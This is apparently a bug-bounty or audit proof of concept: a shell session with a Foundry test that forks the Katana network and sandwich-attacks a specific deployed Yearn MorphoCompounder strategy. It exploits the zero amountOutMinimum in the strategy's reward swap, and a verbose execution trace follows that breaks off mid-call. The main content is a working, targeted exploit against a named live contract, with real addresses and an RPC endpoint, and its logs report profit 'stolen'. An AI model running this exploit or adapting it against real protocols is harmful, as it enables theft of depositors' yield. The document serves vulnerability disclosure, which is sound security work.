# poc:
```solidity
root@Gandhi:/home/gajnithehero/Desktop/Targets/yearnkatanacontractsstra# export REWARD_UNIV3_FEE=500
root@Gandhi:/home/gajnithehero/Desktop/Targets/yearnkatanacontractsstra# export REWARD_TOKEN=0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62
root@Gandhi:/home/gajnithehero/Desktop/Targets/yearnkatanacontractsstra# export KATANA_RPC_URL=https://rpc.katana.network/
root@Gandhi:/home/gajnithehero/Desktop/Targets/yearnkatanacontractsstra# cat test/test.sol
pragma solidity ^0.8.18;
import "forge-std/Test.sol";
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}
interface ITokenizedStrategy {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function keeper() external view returns (address);
    function management() external view returns (address);
    function report() external returns (uint256 _profit, uint256 _loss);
}
enum SwapType {
    NULL,
    UNISWAP_V3,
    AUCTION
}
interface IMorphoCompounder is ITokenizedStrategy {
    function getAllRewardTokens() external view returns (address[] memory);
    function swapType(address token) external view returns (SwapType);
    function minAmountToSellMapping(address token) external view returns (uint256);
    function router() external view returns (address);
    function minAmountToSell() external view returns (uint256);
    function uniFees(address tokenIn, address tokenOut) external view returns (uint24);
    function addRewardToken(address _token, SwapType _swapType) external;
    function setUniFees(address _token0, address _token1, uint24 _fee) external;
}
interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}
contract MorphoCompounderSlippageMEVTest is Test {
    IMorphoCompounder internal strategy;
    ITokenizedStrategy internal tokenized;
    IERC20 internal asset;
    IERC20 internal reward;
    ISwapRouter internal router;
    address internal keeper;
    address internal management;
    address internal attacker;
    function setUp() public {
        string memory rpcUrl = vm.envString("KATANA_RPC_URL");
        uint256 forkId = vm.createFork(rpcUrl);
        vm.selectFork(forkId);
        strategy  = IMorphoCompounder(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12);
        tokenized = ITokenizedStrategy(address(strategy));
        asset   = IERC20(tokenized.asset());
        router  = ISwapRouter(strategy.router());
        keeper  = tokenized.keeper();
        management = tokenized.management();
        attacker   = makeAddr("attacker");
        address[] memory rewards = strategy.getAllRewardTokens();
        for (uint256 i = 0; i < rewards.length; ++i) {
            if (strategy.swapType(rewards[i]) == SwapType.UNISWAP_V3) {
                reward = IERC20(rewards[i]);
                break;
            }
        }
        if (address(reward) == address(0)) {
            // REWARD_TOKEN      = address of some ERC20 with a UniV3 pool vs asset()
            // REWARD_UNIV3_FEE  = fee tier of that pool (e.g. 500, 3000, 10000)
            address rewardFromEnv = vm.envAddress("REWARD_TOKEN");
            uint24  fee           = uint24(vm.envUint("REWARD_UNIV3_FEE"));
            require(
                rewardFromEnv != address(asset),
                "REWARD_TOKEN cannot be the strategy asset"
            );
            reward = IERC20(rewardFromEnv);
            vm.startPrank(management);
            strategy.addRewardToken(rewardFromEnv, SwapType.UNISWAP_V3);
            strategy.setUniFees(rewardFromEnv, address(asset), fee);
            vm.stopPrank();
        }
        require(
            address(reward) != address(0),
            "reward token not configured for UniV3"
        );
    }
    function _seedRewards() internal returns (uint256 rewardAmount, uint256 frontAmount) {
        uint256 globalMin  = strategy.minAmountToSell();
        uint256 mappingMin = strategy.minAmountToSellMapping(address(reward));
        uint256 minThreshold = globalMin > mappingMin ? globalMin : mappingMin;
        uint8  rewardDecimals = reward.decimals();
        uint256 unitReward    = 10 ** uint256(rewardDecimals);
        uint256 extra = unitReward * 1_000;
        rewardAmount  = minThreshold + extra;
        if (rewardAmount == 0) {
            rewardAmount = extra;
        }
        frontAmount = rewardAmount / 2;
        deal(address(reward), address(strategy), rewardAmount);
        deal(address(reward), attacker, frontAmount);
        uint8  assetDecimals = asset.decimals();
        uint256 unitAsset    = 10 ** uint256(assetDecimals);
        deal(address(asset), attacker, unitAsset * 1_000);
    }
    function _runReportWithoutAttack() internal returns (uint256 profit) {
        _seedRewards();
        uint256 beforeAssets = tokenized.totalAssets();
        vm.prank(keeper);
        (uint256 reportedProfit, uint256 reportedLoss) = tokenized.report();
        uint256 afterAssets = tokenized.totalAssets();
        assertEq(reportedLoss, 0, "baseline: reported loss should be zero");
        assertEq(
            afterAssets,
            beforeAssets + reportedProfit,
            "baseline: profit mismatch"
        );
        profit = reportedProfit;
    }
    function _runReportWithSandwich() internal returns (uint256 profit) {
        (, uint256 frontAmount) = _seedRewards();
        uint256 beforeAssets = tokenized.totalAssets();
        uint24 fee = strategy.uniFees(address(reward), address(asset));
        require(fee > 0, "no UniV3 fee configured for reward/asset");
        vm.startPrank(attacker);
        reward.approve(address(router), type(uint256).max);
        ISwapRouter.ExactInputSingleParams memory paramsFront = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: address(reward),
                tokenOut: address(asset),
                fee: fee,
                recipient: attacker,
                deadline: block.timestamp,
                amountIn: frontAmount,
                amountOutMinimum: 0, // attacker accepts any rate
                sqrtPriceLimitX96: 0
            });
        router.exactInputSingle(paramsFront);
        vm.stopPrank();
        vm.prank(keeper);
        (uint256 reportedProfit, uint256 reportedLoss) = tokenized.report();
        uint256 afterAssets = tokenized.totalAssets();
        assertEq(reportedLoss, 0, "attacked: unexpected explicit loss recorded");
        profit = reportedProfit;
        assertEq(
            afterAssets,
            beforeAssets + reportedProfit,
            "attacked: profit mismatch"
        );
    }
    function testSandwichReducesReportedProfit() public {
        uint256 snap = vm.snapshot();
        uint256 baselineProfit = _runReportWithoutAttack();
        vm.revertTo(snap);
        uint256 attackedProfit = _runReportWithSandwich();
        emit log_named_uint("baseline profit (no MEV)", baselineProfit);
        emit log_named_uint("attacked profit (with sandwich)", attackedProfit);
        emit log_named_uint(
            "profit stolen (difference)",
            baselineProfit - attackedProfit
        );
        assertLt(attackedProfit, baselineProfit, "sandwich should reduce strategy profit");
    }
}
```

```bash
root@Gandhi:/home/gajnithehero/Desktop/Targets/yearnkatanacontractsstra# forge test -vvvv
[⠒] Compiling...
No files changed, compilation skipped

Warning: the following cheatcode(s) are deprecated and will be removed in future versions:
  revertTo(uint256): replaced by `revertToState`
  snapshot(): replaced by `snapshotState`
Ran 1 test for test/test.sol:MorphoCompounderSlippageMEVTest
[PASS] testSandwichReducesReportedProfit() (gas: 16854556)
Logs:
  baseline profit (no MEV): 1861689536584
  attacked profit (with sandwich): 814532325501
  profit stolen (difference): 1047157211083

Traces:
  [17437256] MorphoCompounderSlippageMEVTest::testSandwichReducesReportedProfit()
    ├─ [0] VM::snapshot()
    │   └─ ← [Return] 0
    ├─ [2374] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::minAmountToSell() [staticcall]
    │   └─ ← [Return] 0
    ├─ [2566] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::minAmountToSellMapping(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62) [staticcall]
    │   └─ ← [Return] 0
    ├─ [9664] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::decimals() [staticcall]
    │   ├─ [2460] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::decimals() [delegatecall]
    │   │   └─ ← [Return] 18
    │   └─ ← [Return] 18
    ├─ [3508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [2780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62) [staticcall]
    │   └─ ← [Return] [0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef], []
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, slot: 62383759998050452719176739997299241539497671211442363241994204971096751849199 [6.238e76])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, fsig: 0x70a08231, keysHash: 0x04f2f6350d549d0b09e534b5449b3e137ced476ed49ffeff61284a278d4cde74, slot: 62383759998050452719176739997299241539497671211442363241994204971096751849199 [6.238e76])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef, 0x00000000000000000000000000000000000000000000003635c9adc5dea00000)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   └─ ← [Return] 1000000000000000000000 [1e21]
    ├─ [3508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [2780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62) [staticcall]
    │   └─ ← [Return] [0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15], []
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, fsig: 0x70a08231, keysHash: 0x95e39942d3d4e3c52b847ed093f9085ab6d2d9a023036bf9d1450847eda30f16, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 500000000000000000000 [5e20]
    │   └─ ← [Return] 500000000000000000000 [5e20]
    ├─ [9642] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::decimals() [staticcall]
    │   ├─ [2438] 0x5e875267f65537768435C3C6C81cd313a570B422::decimals() [delegatecall]
    │   │   └─ ← [Return] 6
    │   └─ ← [Return] 6
    ├─ [3486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [2758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36) [staticcall]
    │   └─ ← [Return] [0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15], []
    ├─ [0] VM::load(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, fsig: 0x70a08231, keysHash: 0x95e39942d3d4e3c52b847ed093f9085ab6d2d9a023036bf9d1450847eda30f16, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x000000000000000000000000000000000000000000000000000000003b9aca00)
    │   └─ ← [Return]
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 1000000000 [1e9]
    │   └─ ← [Return] 1000000000 [1e9]
    ├─ [5408] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::totalAssets() [staticcall]
    │   ├─ [2507] 0xD377919FA87120584B21279a491F82D5265A139c::totalAssets() [delegatecall]
    │   │   └─ ← [Return] 30567291587044 [3.056e13]
    │   └─ ← [Return] 30567291587044 [3.056e13]
    ├─ [0] VM::prank(0xC29cbdcf5843f8550530cc5d627e1dd3007EF231)
    │   └─ ← [Return]
    ├─ [7796553] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::report()
    │   ├─ [7796149] 0xD377919FA87120584B21279a491F82D5265A139c::report() [delegatecall]
    │   │   ├─ [7752187] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::49317f1d()
    │   │   │   ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   │   │   │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   │   │   ├─ [3989] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [staticcall]
    │   │   │   │   ├─ [3258] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [5318] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 0)
    │   │   │   │   ├─ [4608] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 0) [delegatecall]
    │   │   │   │   │   ├─ emit Approval(owner: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, spender: 0x4e1d81A3E627b9294532e990109e4c21d217376C, value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1989] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [staticcall]
    │   │   │   │   ├─ [1258] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [23218] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 1000000000000000000000 [1e21])
    │   │   │   │   ├─ [22508] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 1000000000000000000000 [1e21]) [delegatecall]
    │   │   │   │   │   ├─ emit Approval(owner: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, spender: 0x4e1d81A3E627b9294532e990109e4c21d217376C, value: 1000000000000000000000 [1e21])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [7238283] 0x4e1d81A3E627b9294532e990109e4c21d217376C::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, tokenOut: 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, fee: 500, recipient: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, deadline: 1764232342 [1.764e9], amountIn: 1000000000000000000000 [1e21], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   │   │   │   ├─ [7230822] 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B::swap(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, false, 1000000000000000000000 [1e21], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000078ec25fba1baf6b7dc097ebb8115a390a2a4ee12000000000000000000000000000000000000000000000000000000000000002bee7d8bcfb72bc1880d0cf19822eb0a2e6577ab620001f4203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000000000000000000000)
    │   │   │   │   │   ├─ [32913] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::transfer(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 1855634437106 [1.855e12])
    │   │   │   │   │   │   ├─ [32182] 0x5e875267f65537768435C3C6C81cd313a570B422::transfer(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 1855634437106 [1.855e12]) [delegatecall]
    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, to: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, value: 1855634437106 [1.855e12])
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [3508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [staticcall]
    │   │   │   │   │   │   ├─ [2780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 1533847496599926410526 [1.533e21]
    │   │   │   │   │   │   └─ ← [Return] 1533847496599926410526 [1.533e21]
    │   │   │   │   │   ├─ [11399] 0x4e1d81A3E627b9294532e990109e4c21d217376C::uniswapV3SwapCallback(-1855634437106 [-1.855e12], 1000000000000000000000 [1e21], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000078ec25fba1baf6b7dc097ebb8115a390a2a4ee12000000000000000000000000000000000000000000000000000000000000002bee7d8bcfb72bc1880d0cf19822eb0a2e6577ab620001f4203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000000000000000000000)
